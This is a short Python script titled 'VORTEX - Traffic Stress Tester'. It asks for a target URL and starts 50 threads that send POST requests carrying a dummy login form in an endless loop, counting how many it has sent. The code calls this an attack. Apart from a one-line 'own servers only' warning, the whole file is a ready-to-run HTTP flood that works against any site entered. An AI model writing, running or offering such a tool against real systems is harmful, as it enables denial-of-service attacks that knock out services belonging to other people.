import requests
import threading
import sys
import os
import time

def banner():
    os.system('clear')
    print("\033[1;35m")
    print(" __      __   ____   _____  _______  ________   __")
    print(" \ \    / /  / __ \ |  __ \|__   __||  ____\ \ / /")
    print("  \ \  / /  | |  | || |__) |  | |   | |__   \ V / ")
    print("   \ \/ /   | |  | ||  _  /   | |   |  __|   > <  ")
    print("    \  /    | |__| || | \ \   | |   | |____ / . \ ")
    print("     \/      \____/ |_|  \_\  |_|   |______/_/ \_\\")
    print("\n      [ VORTEX - Traffic Stress Tester ]")
    print("\033[0m")

count = 0

def attack(url, data):
    global count
    while True:
        try:
            # Send the request
            requests.post(url, data=data)
            count += 1
            print(f"\r\033[1;32m[+] Packets Sent: {count}\033[0m", end="")
        except:
            print(f"\r\033[1;31m[-] Connection Failed\033[0m", end="")

def start_stress():
    banner()
    print("\033[1;31m[!] WARNING: Use only on your own testing servers.\033[0m")
    url = input("\n\033[1;36m[?] Enter Target URL (POST): \033[0m")
    
    if not url: sys.exit()
    
    # Fake Data Packet
    payload = {'username': 'admin', 'password': 'password123', 'submit': 'Login'}

    print(f"\n\033[1;33m[*] Starting Stress Test on {url}...\033[0m")
    time.sleep(1)

    # Launch 50 threads
    for i in range(50):
        t = threading.Thread(target=attack, args=(url, payload))
        t.daemon = True
        t.start()

    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\033[1;31m[!] Stopping Attack.\033[0m")
        sys.exit()

if __name__ == "__main__":
    start_stress()

